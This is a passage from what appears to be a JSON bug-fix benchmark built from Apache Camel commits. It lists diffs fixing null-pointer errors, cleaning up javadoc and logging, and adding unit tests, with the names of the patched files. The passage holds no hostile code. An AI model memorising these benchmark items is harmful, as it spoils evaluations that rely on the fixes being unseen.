out\n+\n+log4j.logger.org.apache.activemq.spring=WARN\n+#log4j.logger.org.apache.camel=DEBUG\n+#log4j.logger.org.apache.camel.component=TRACE\n+#log4j.logger.org.apache.camel.component.seda=TRACE\n+#log4j.logger.org.apache.camel.impl.DefaultUnitOfWork=TRACE\n+#log4j.logger.org.apache.camel.component.mock=DEBUG\n+#log4j.logger.org.apache.camel.component.file=TRACE\n+#log4j.logger.org.apache.camel.processor.Pipeline=TRACE\n+#log4j.logger.org.apache.camel.processor.MulticastProcessor=TRACE\n+#log4j.logger.org.apache.camel.processor.RecipientList=TRACE\n+#log4j.logger.org.apache.camel.processor.RecipientListProcessor=TRACE\n+#log4j.logger.org.apache.camel.processor.RoutingSlip=TRACE\n+#log4j.logger.org.apache.camel.processor.TryProcessor=TRACE\n+#log4j.logger.org.apache.camel.processor.loadbalancer=TRACE\n+#log4j.logger.org.apache.camel.processor.Delayer=TRACE\n+#log4j.logger.org.apache.camel.processor.Throttler=TRACE\n+log4j.logger.org.apache.camel.impl.converter=WARN\n+log4j.logger.org.apache.camel.management=WARN\n+log4j.logger.org.apache.camel.impl.DefaultPackageScanClassResolver=WARN\n+#log4j.logger.org.apache.camel.impl=TRACE\n+#log4j.logger.org.apache.camel.util.FileUtil=TRACE\n+#log4j.logger.org.apache.camel.impl.converter.DefaultTypeConverter=TRACE\n+\n+# CONSOLE appender not used by default\n+log4j.appender.out=org.apache.log4j.ConsoleAppender\n+log4j.appender.out.layout=org.apache.log4j.PatternLayout\n+log4j.appender.out.layout.ConversionPattern=%d [%-15.15t] %-5p %-30.30c{1} - %m%n\n+\n+# File appender\n+log4j.appender.file=org.apache.log4j.FileAppender\n+log4j.appender.file.layout=org.apache.log4j.PatternLayout\n+log4j.appender.file.layout.ConversionPattern=%d [%-15.15t] %-5p %-30.30c{1} - %m%n\n+log4j.appender.file.file=target/camel-core-test.log\n+log4j.appender.file.append=true\n+\n+log4j.throwableRenderer=org.apache.log4j.EnhancedThrowableRenderer\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3/components/camel-web/src/main/resources/log4j.properties",
                "sha": "75005f9349bdb540d754e96374149093a31305ef",
                "status": "added"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3/components/camel-web/src/main/webapp/org/apache/camel/web/resources/RouteResource.index.ssp",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-web/src/main/webapp/org/apache/camel/web/resources/RouteResource.index.ssp?ref=ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3",
                "deletions": 5,
                "filename": "components/camel-web/src/main/webapp/org/apache/camel/web/resources/RouteResource.index.ssp",
                "patch": "@@ -1,23 +1,23 @@\n <%@ import val it: RouteResource %>\n \n-#{ attributes(\"title\") = \"Route ${it.getRoute.getId}\"}#\n+#{ attributes(\"title\") = \"Route ${it.getId}\"}#\n \n   <link href='${uri(\"/css/prettify/prettify.css\")}' type=\"text/css\" rel=\"stylesheet\" />\n   <script type=\"text/javascript\" src='${uri(\"/js/prettify/prettify.js\")}'></script>\n \n <body onload=\"prettyPrint()\">\n \n-<h2>Route  ${it.getRoute.getId}</h2>\n+<h2>Route  ${it.getId}</h2>\n \n-<p>${it.getRoute.getDescription.getText}</p>\n+<p>${it.getRoute.getDescriptionText}</p>\n \n <div class=\"route\">\n <pre class=\"prettyprint\">${escape(it.getRouteXml)}</pre>\n </div>\n \n <ul>\n-<li><a href='${uri(\"/routes/\" + it.getRoute.getId + \"/lang/xml/edit\")}'>Edit Route in Xml</a>\n-<li><a href='${uri(\"/routes/\" + it.getRoute.getId + \"/lang/groovy/edit\")}'>Edit Route in Groovy</a>\n+<li><a href='${uri(\"/routes/\" + it.getId + \"/lang/xml/edit\")}'>Edit Route in Xml</a>\n+<li><a href='${uri(\"/routes/\" + it.getId + \"/lang/groovy/edit\")}'>Edit Route in Groovy</a>\n <li>Edit Route in Ruby\n <li>Edit Route in Scala \n </ul>",
                "raw_url": "https://github.com/apache/camel/raw/ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3/components/camel-web/src/main/webapp/org/apache/camel/web/resources/RouteResource.index.ssp",
                "sha": "83de8d8819ffa3ceef1b61b1f90de8936806e7d5",
                "status": "modified"
            }
        ],
        "message": "added helper method & avoided NPE in view for CAMEL-3028\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@982981 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/85729a555fa863168f70a4a7f5be8f809c303915",
        "patched_files": [
            "Route.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RouteTest.java",
            "TestRoute.java"
        ]
    },
    "camel_ceb0848": {
        "bug_id": "camel_ceb0848",
        "commit": "https://github.com/apache/camel/commit/ceb084830a1a4617c147ea9bace2f08501dba3b6",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/ceb084830a1a4617c147ea9bace2f08501dba3b6/components/camel-netty/src/main/java/org/apache/camel/component/netty/NettyConverter.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-netty/src/main/java/org/apache/camel/component/netty/NettyConverter.java?ref=ceb084830a1a4617c147ea9bace2f08501dba3b6",
                "deletions": 1,
                "filename": "components/camel-netty/src/main/java/org/apache/camel/component/netty/NettyConverter.java",
                "patch": "@@ -48,7 +48,10 @@ private NettyConverter() {\n     public static String toString(ChannelBuffer buffer, Exchange exchange) {\n         byte[] bytes = toByteArray(buffer);\n         // use type converter as it can handle encoding set on the Exchange\n-        return exchange.getContext().getTypeConverter().convertTo(String.class, exchange, bytes);\n+        if (exchange != null) {\n+            return exchange.getContext().getTypeConverter().convertTo(String.class, exchange, bytes);\n+        }\n+        return new String(bytes);\n     }\n \n     @Converter",
                "raw_url": "https://github.com/apache/camel/raw/ceb084830a1a4617c147ea9bace2f08501dba3b6/components/camel-netty/src/main/java/org/apache/camel/component/netty/NettyConverter.java",
                "sha": "66ba13c3091711c72fdb765041271c75a0198e6c",
                "status": "modified"
            },
            {
                "additions": 60,
                "blob_url": "https://github.com/apache/camel/blob/ceb084830a1a4617c147ea9bace2f08501dba3b6/components/camel-netty/src/test/java/org/apache/camel/component/netty/NettyConverterTest.java",
                "changes": 60,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-netty/src/test/java/org/apache/camel/component/netty/NettyConverterTest.java?ref=ceb084830a1a4617c147ea9bace2f08501dba3b6",
                "deletions": 0,
                "filename": "components/camel-netty/src/test/java/org/apache/camel/component/netty/NettyConverterTest.java",
                "patch": "@@ -0,0 +1,60 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.netty;\n+\n+import org.apache.camel.impl.DefaultExchange;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.jboss.netty.buffer.ChannelBuffer;\n+import org.jboss.netty.buffer.DynamicChannelBuffer;\n+import org.junit.Before;\n+import org.junit.Test;\n+\n+/**\n+ * Utility test to verify netty type converter.\n+ */\n+public class NettyConverterTest extends CamelTestSupport {\n+\n+    /**\n+     * Test payload to send.\n+     */\n+    private  static final String PAYLOAD = \"Test Message\";\n+\n+    private ChannelBuffer buf;\n+\n+    @Before\n+    public void startUp() {\n+        byte[] bytes = PAYLOAD.getBytes();\n+        buf = new DynamicChannelBuffer(bytes.length);\n+        buf.writeBytes(bytes);\n+    }\n+\n+    @Test\n+    public void testConversionWithExchange() {\n+        String result = context.getTypeConverter().convertTo(String.class, new DefaultExchange(context), buf);\n+        assertNotNull(result);\n+        assertEquals(PAYLOAD, result);\n+    }\n+\n+\n+    @Test\n+    public void testConversionWithoutExchange() {\n+        String result = context.getTypeConverter().convertTo(String.class, buf);\n+        assertNotNull(result);\n+        assertEquals(PAYLOAD, result);\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/ceb084830a1a4617c147ea9bace2f08501dba3b6/components/camel-netty/src/test/java/org/apache/camel/component/netty/NettyConverterTest.java",
                "sha": "e65f39cabbd5628395861880210c8a57ba1f1215",
                "status": "added"
            }
        ],
        "message": "CAMEL-5317: Fixed potential NPE in netty converter. Thanks to Lukasz for the patch.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1343758 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/78d83eae75f82656a6e0c4b42fd12b7c889c5d1c",
        "patched_files": [
            "NettyConverter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "NettyConverterTest.java"
        ]
    },
    "camel_d643d6b": {
        "bug_id": "camel_d643d6b",
        "commit": "https://github.com/apache/camel/commit/d643d6b492becb3b8705e30bf1c68fc6503ee655",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -66,8 +66,8 @@\n     private static int nameSuffix;\n \n     private String name;\n-    private Map<String, Endpoint> endpoints = new HashMap<String, Endpoint>();\n-    private Map<String, Component> components = new HashMap<String, Component>();\n+    private final Map<String, Endpoint> endpoints = new HashMap<String, Endpoint>();\n+    private final Map<String, Component> components = new HashMap<String, Component>();\n     private List<Route> routes;\n     private List<Service> servicesToClose = new ArrayList<Service>();\n     private TypeConverter typeConverter;\n@@ -546,8 +546,7 @@ protected Endpoint createEndpoint(String uri) {\n      * some kind of transformation or wrapper\n      *\n      * @param uri the uri for the endpoint (and name in the registry)\n-     * @param bean the bean to be converted to an endpoint, which will be not\n-     *                null\n+     * @param bean the bean to be converted to an endpoint, which will be not null\n      * @return a new endpoint\n      */\n     protected Endpoint convertBeanToEndpoint(String uri, Object bean) {",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "875c009f0c7eb36fe10048c0cfba79713137884d",
                "status": "modified"
            },
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java",
                "changes": 19,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 10,
                "filename": "camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java",
                "patch": "@@ -32,19 +32,22 @@\n import java.util.Map.Entry;\n import java.util.Set;\n \n-\n import org.apache.camel.TypeConverter;\n+import org.apache.commons.logging.Log;\n+import org.apache.commons.logging.LogFactory;\n \n public final class IntrospectionSupport {\n \n+    private static final Log LOG = LogFactory.getLog(IntrospectionSupport.class);\n+\n+\n     /**\n      * Utility classes should not have a public constructor.\n      */\n     private IntrospectionSupport() {\n     }\n \n     public static boolean getProperties(Object target, Map props, String optionPrefix) {\n-\n         boolean rc = false;\n         if (target == null) {\n             throw new IllegalArgumentException(\"target was null.\");\n@@ -64,9 +67,7 @@ public static boolean getProperties(Object target, Map props, String optionPrefi\n             Class type = method.getReturnType();\n             Class params[] = method.getParameterTypes();\n             if (name.startsWith(\"get\") && params.length == 0 && type != null && isSettableType(type)) {\n-\n                 try {\n-\n                     Object value = method.invoke(target, new Object[] {});\n                     if (value == null) {\n                         continue;\n@@ -80,10 +81,9 @@ public static boolean getProperties(Object target, Map props, String optionPrefi\n                     name = name.substring(3, 4).toLowerCase() + name.substring(4);\n                     props.put(optionPrefix + name, strValue);\n                     rc = true;\n-\n                 } catch (Throwable ignore) {\n+                    // ignore\n                 }\n-\n             }\n         }\n \n@@ -322,7 +322,6 @@ public static String simpleName(Class clazz) {\n     }\n \n     private static void addFields(Object target, Class startClass, Class stopClass, LinkedHashMap map) {\n-\n         if (startClass != stopClass) {\n             addFields(target, startClass.getSuperclass(), stopClass, map);\n         }\n@@ -341,14 +340,14 @@ private static void addFields(Object target, Class startClass, Class stopClass,\n                     try {\n                         o = Arrays.asList((Object[])o);\n                     } catch (Throwable e) {\n+                        // ignore\n                     }\n                 }\n                 map.put(field.getName(), o);\n             } catch (Throwable e) {\n-                // TODO: LOG or rethrow\n-                e.printStackTrace();\n+                LOG.debug(\"Error adding fields\", e);\n             }\n         }\n-\n     }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/IntrospectionSupport.java",
                "sha": "a973348270ab5b8554dc5952b84a0e698365896a",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/LRUCache.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/LRUCache.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/util/LRUCache.java",
                "patch": "@@ -42,15 +42,15 @@ public LRUCache(int maximumCacheSize) {\n      * @param accessOrder      the ordering mode - <tt>true</tt> for\n      *                         access-order, <tt>false</tt> for insertion-order.\n      * @throws IllegalArgumentException if the initial capacity is negative\n-     *                                  or the load factor is nonpositive.\n+     *                                  or the load factor is non positive.\n      */\n     public LRUCache(int initialCapacity, int maximumCacheSize, float loadFactor, boolean accessOrder) {\n         super(initialCapacity, loadFactor, accessOrder);\n         this.maxCacheSize = maximumCacheSize;\n     }\n \n     /**\n-     * @return Returns the maxCacheSize.\n+     * Returns the maxCacheSize.\n      */\n     public int getMaxCacheSize() {\n         return maxCacheSize;",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/LRUCache.java",
                "sha": "dd5937530facfc5039abccbcd117e0582fda49f8",
                "status": "modified"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "patch": "@@ -171,8 +171,11 @@ public static String removeStartingCharacters(String text, char ch) {\n     }\n \n     public static String capitalize(String text) {\n+        if (text == null) {\n+            return null;\n+        }\n         int length = text.length();\n-        if (text == null || length == 0) {\n+        if (length == 0) {\n             return text;\n         }\n         String answer = text.substring(0, 1).toUpperCase();\n@@ -404,6 +407,7 @@ public static Class convertPrimitiveTypeToWrapperType(Class type) {\n                 rc = Short.class;\n             } else if (type == byte.class) {\n                 rc = Byte.class;\n+            // TODO: Why is boolean disabled\n /*\n             } else if (type == boolean.class) {\n                 rc = Boolean.class;\n@@ -530,7 +534,7 @@ public static boolean isJavaIdentifier(String name) {\n     }\n \n     /**\n-     * returns the type of the given object or null if the value is null\n+     * Returns the type of the given object or null if the value is null\n      */\n     public static Object type(Object bean) {\n         return bean != null ? bean.getClass() : null;",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "sha": "59e73143021532e99d5b7c21553ca60abf7c5e0d",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/PackageHelper.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/PackageHelper.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/PackageHelper.java",
                "patch": "@@ -25,7 +25,8 @@\n  * @version $Revision$\n  */\n public final class PackageHelper {\n-    public static final transient Log LOG = LogFactory.getLog(PackageHelper.class);\n+    private static final transient Log LOG = LogFactory.getLog(PackageHelper.class);\n+\n     private PackageHelper() {\n         // Utility Class\n     }",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/PackageHelper.java",
                "sha": "94b481fc6a296692181647c843471e1bdccc529c",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterLoader.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterLoader.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterLoader.java",
                "patch": "@@ -16,8 +16,6 @@\n  */\n package org.apache.camel.util;\n \n-\n-\n import java.lang.reflect.Method;\n import java.util.ArrayList;\n import java.util.Collections;",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterLoader.java",
                "sha": "74921eeffc3476ac73e9c2907aad8020ceea772e",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterRegistry.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterRegistry.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterRegistry.java",
                "patch": "@@ -31,7 +31,6 @@\n     }\n \n     public void addTypeConverter(Class toType, Class fromType, TypeConverter typeConverter) {\n-\n         if (errors.size() == 0) {\n             errors.add(\"Method should not be invoked.\");\n         }",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ReportingTypeConverterRegistry.java",
                "sha": "60866465583868fa149ebc9fba2fd74f942952a8",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ResolverUtil.java",
                "changes": 25,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ResolverUtil.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 11,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ResolverUtil.java",
                "patch": "@@ -126,7 +126,9 @@ public String toString() {\n     public static class AnnotatedWith implements Test {\n         private Class<? extends Annotation> annotation;\n \n-        /** Construts an AnnotatedWith test for the specified annotation type. */\n+        /**\n+         * Constructs an AnnotatedWith test for the specified annotation type.\n+         */\n         public AnnotatedWith(Class<? extends Annotation> annotation) {\n             this.annotation = annotation;\n         }\n@@ -323,14 +325,15 @@ private void loadImplementationsInDirectory(Test test, String parent, File locat\n             String name = file.getName();\n             if (name != null) {\n                 name = name.trim();\n-            }\n-            builder.append(parent).append(\"/\").append(name);\n-            String packageOrClass = parent == null ? name : builder.toString();\n \n-            if (file.isDirectory()) {\n-                loadImplementationsInDirectory(test, packageOrClass, file);\n-            } else if (name.endsWith(\".class\")) {\n-                addIfMatching(test, packageOrClass);\n+                builder.append(parent).append(\"/\").append(name);\n+                String packageOrClass = parent == null ? name : builder.toString();\n+\n+                if (file.isDirectory()) {\n+                    loadImplementationsInDirectory(test, packageOrClass, file);\n+                } else if (name.endsWith(\".class\")) {\n+                    addIfMatching(test, packageOrClass);\n+                }\n             }\n         }\n     }\n@@ -355,9 +358,9 @@ private void loadImplementationsInJar(Test test, String parent, File jarfile) {\n                 String name = entry.getName();\n                 if (name != null) {\n                     name = name.trim();\n-                }\n-                if (!entry.isDirectory() && name.startsWith(parent) && name.endsWith(\".class\")) {\n-                    addIfMatching(test, name);\n+                    if (!entry.isDirectory() && name.startsWith(parent) && name.endsWith(\".class\")) {\n+                        addIfMatching(test, name);\n+                    }\n                 }\n             }\n         } catch (IOException ioe) {",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/ResolverUtil.java",
                "sha": "83c6d939282b7ac4463d820f48158a65657f9d1a",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "changes": 16,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/URISupport.java?ref=d643d6b492becb3b8705e30bf1c68fc6503ee655",
                "deletions": 11,
                "filename": "camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "patch": "@@ -31,6 +31,7 @@\n  * @version $Revision$\n  */\n public class URISupport {\n+\n     public static class CompositeData {\n         public String host;\n \n@@ -165,12 +166,6 @@ public static CompositeData parseComposite(URI uri) throws URISyntaxException {\n         return rc;\n     }\n \n-    /**\n-     * @param uri\n-     * @param rc\n-     * @param ssp\n-     * @throws URISyntaxException\n-     */\n     private static void parseComposite(URI uri, CompositeData rc, String ssp) throws URISyntaxException {\n         String componentString;\n         String params;\n@@ -216,10 +211,6 @@ private static void parseComposite(URI uri, CompositeData rc, String ssp) throws\n         }\n     }\n \n-    /**\n-     * @param str\n-     * @return\n-     */\n     private static String[] splitComponents(String str) {\n         ArrayList l = new ArrayList();\n \n@@ -294,7 +285,7 @@ public static String createQueryString(Map options) throws URISyntaxException {\n     }\n \n     /**\n-     * Creates a URI from the original URI and the remaining paramaters\n+     * Creates a URI from the original URI and the remaining parameters\n      * \n      * @throws URISyntaxException\n      */\n@@ -332,6 +323,9 @@ public static boolean checkParenthesis(String str) {\n         return result;\n     }\n \n+    /**\n+     * @deprecated this method will be removed in a future release \n+     */\n     public int indexOfParenthesisMatch(String str) {\n         int result = -1;\n ",
                "raw_url": "https://github.com/apache/camel/raw/d643d6b492becb3b8705e30bf1c68fc6503ee655/camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "sha": "7971e5bce6ad3b71c870594eab7f467fa187063e",
                "status": "modified"
            }
        ],
        "message": "Various error reported by IDEA fixed:\n- javadoc polished\n- changed logger to private\n- added logging instead of e.printstacktrace\n- avoid potenital NPE if name is null\n- added final modified for synchronized object\n- added TODO why boolean is not part of primitives (James, you are the one that disabled this)\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@655284 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/db71c7b6c4ce58b04c4ef0efa9a454101ea10fbd",
        "patched_files": [
            "ObjectHelper.java",
            "IntrospectionSupport.java",
            "PackageHelper.java",
            "DefaultCamelContext.java",
            "URISupport.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java",
            "PackageHelperTest.java",
            "ObjectHelperTest.java",
            "IntrospectionSupportTest.java",
            "URISupportTest.java"
        ]
    },
    "camel_d775f2e": {
        "bug_id": "camel_d775f2e",
        "commit": "https://github.com/apache/camel/commit/d775f2e42847840be5469c728b0fb0578f997ba1",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/d775f2e42847840be5469c728b0fb0578f997ba1/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=d775f2e42847840be5469c728b0fb0578f997ba1",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -512,7 +512,7 @@ protected Endpoint addEndpointToRegistry(String uri, Endpoint endpoint) {\n     }\n \n     public Route getRoute(String id) {\n-        for (Route route : routes) {\n+        for (Route route : getRoutes()) {\n             if (route.getId().equals(id)) {\n                 return route;\n             }",
                "raw_url": "https://github.com/apache/camel/raw/d775f2e42847840be5469c728b0fb0578f997ba1/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "53bb1744f04ee8137e563de9175235f205167d6e",
                "status": "modified"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/d775f2e42847840be5469c728b0fb0578f997ba1/camel-core/src/test/java/org/apache/camel/impl/DefaultCamelContextTest.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/impl/DefaultCamelContextTest.java?ref=d775f2e42847840be5469c728b0fb0578f997ba1",
                "deletions": 1,
                "filename": "camel-core/src/test/java/org/apache/camel/impl/DefaultCamelContextTest.java",
                "patch": "@@ -224,6 +224,11 @@ public void testHasEndpoint() throws Exception {\n     public void testGetRouteById() throws Exception {\n         DefaultCamelContext ctx = new DefaultCamelContext();\n         ctx.disableJMX();\n+\n+        // should not throw NPE (CAMEL-3198)\n+        Route route = ctx.getRoute(\"coolRoute\");\n+        assertNull(route);\n+\n         ctx.addRoutes(new RouteBuilder() {\n             @Override\n             public void configure() throws Exception {\n@@ -232,7 +237,7 @@ public void configure() throws Exception {\n         });\n         ctx.start();\n \n-        Route route = ctx.getRoute(\"coolRoute\");\n+        route = ctx.getRoute(\"coolRoute\");\n         assertNotNull(route);\n         assertEquals(\"coolRoute\", route.getId());\n         assertEquals(\"direct://start\", route.getConsumer().getEndpoint().getEndpointUri());",
                "raw_url": "https://github.com/apache/camel/raw/d775f2e42847840be5469c728b0fb0578f997ba1/camel-core/src/test/java/org/apache/camel/impl/DefaultCamelContextTest.java",
                "sha": "e4aa1a9812fafaa3d18d776c76bbc28e077bd085",
                "status": "modified"
            }
        ],
        "message": "CAMEL-3198. Fix NPE in DefaultCamelContext. Thanks to Stefan for proposed fix.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1005333 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/4a4e4c18aee43d9e62b2f98fe3135c3075ea090b",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_d843200": {
        "bug_id": "camel_d843200",
        "commit": "https://github.com/apache/camel/commit/d84320047b3070e99a48e5d478fd9fecd7174b07",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/d84320047b3070e99a48e5d478fd9fecd7174b07/components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarComponent.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarComponent.java?ref=d84320047b3070e99a48e5d478fd9fecd7174b07",
                "deletions": 6,
                "filename": "components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarComponent.java",
                "patch": "@@ -44,13 +44,13 @@ protected GoogleCalendarApiName getApiName(String apiNameStr) throws IllegalArgu\n         return GoogleCalendarApiName.fromValue(apiNameStr);\n     }\n \n-    public Calendar getClient() {\n+    public Calendar getClient(GoogleCalendarConfiguration config) {\n         if (client == null) {\n-            client = getClientFactory().makeClient(configuration.getClientId(),\n-                    configuration.getClientSecret(), configuration.getScopes(),\n-                    configuration.getApplicationName(), configuration.getRefreshToken(),\n-                    configuration.getAccessToken(), configuration.getEmailAddress(),\n-                    configuration.getP12FileName(), configuration.getUser());\n+            client = getClientFactory().makeClient(config.getClientId(),\n+                    config.getClientSecret(), config.getScopes(),\n+                    config.getApplicationName(), config.getRefreshToken(),\n+                    config.getAccessToken(), config.getEmailAddress(),\n+                    config.getP12FileName(), config.getUser());\n         }\n         return client;\n     }\n@@ -64,6 +64,9 @@ public GoogleCalendarClientFactory getClientFactory() {\n \n     @Override\n     public GoogleCalendarConfiguration getConfiguration() {\n+        if (configuration == null) {\n+            configuration = new GoogleCalendarConfiguration();\n+        }\n         return super.getConfiguration();\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/d84320047b3070e99a48e5d478fd9fecd7174b07/components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarComponent.java",
